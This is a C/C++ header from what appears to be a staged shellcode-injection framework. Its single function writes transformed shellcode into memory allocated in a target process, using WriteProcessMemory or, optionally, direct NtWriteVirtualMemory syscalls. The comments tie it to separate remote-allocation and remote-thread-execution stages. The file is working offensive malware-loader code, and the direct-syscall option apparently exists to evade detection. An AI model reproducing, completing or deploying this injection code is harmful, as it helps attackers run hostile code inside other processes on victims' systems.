#pragma once
#include "../../api/api_wrappers.h"
#include "../../core/utils.h"
#include "../context.h"

// T4.3 — Remote write
//
// Writes the (transformed) shellcode into the remote-allocated memory
// region using WriteProcessMemory (or NtWriteVirtualMemory under
// USE_DIRECT_SYSCALLS). Must be paired with T2.3 (alloc_remote) and
// T5.4 (exec_remote_thread).
inline BOOL Stage4_Write_Remote(TechniqueContext* ctx)
{
    if (!ctx || !ctx->allocated_mem || !ctx->data || !ctx->target_process)
        return FALSE;

    SIZE_T written = 0;
    BOOL ok = MyWriteProcessMemory(
        ctx->target_process,
        ctx->allocated_mem,
        ctx->data,
        ctx->length,
        &written
    );

#ifdef DEBUG_MODE
    DEBUG_MSG("Stage 4", "Remote write: ok=%d, %llu/%llu bytes",
              ok, (unsigned long long)written, (unsigned long long)ctx->length);
#endif

    return ok && written == ctx->length;
}
